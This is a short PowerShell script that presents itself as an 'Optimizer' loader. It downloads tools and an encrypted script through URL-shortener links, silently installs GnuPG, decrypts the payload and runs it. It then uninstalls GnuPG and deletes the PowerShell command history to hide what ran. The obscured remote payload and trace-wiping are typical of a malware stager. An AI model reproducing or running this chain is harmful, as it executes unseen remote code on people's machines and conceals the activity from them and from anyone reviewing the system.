##V.0.6

Set-ExecutionPolicy -ExecutionPolicy Bypass
Invoke-WebRequest -Uri "https://cutt.ly/UN0iz0z" -OutFile "$env:temp\gnupg-w32-2.3.8_20221013.exe"
cmd.exe /c $env:temp\gnupg-w32-2.3.8_20221013.exe /S /V /QN
Invoke-WebRequest -Uri "https://cutt.ly/xN0inMf" -OutFile "$env:temp\Optimizerv6.ps1.gpg"
& 'C:\Program Files (x86)\GnuPG\bin\gpg.exe' -d $env:temp\Optimizerv6.ps1.gpg >> $env:temp\Optimizerv6.ps1
. $env:temp\Optimizerv6.ps1
& 'C:\Program Files (x86)\GnuPG\gnupg-uninstall.exe' /S /V /QN
Remove-Item $env:appdata\gnupg -Recurse
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath
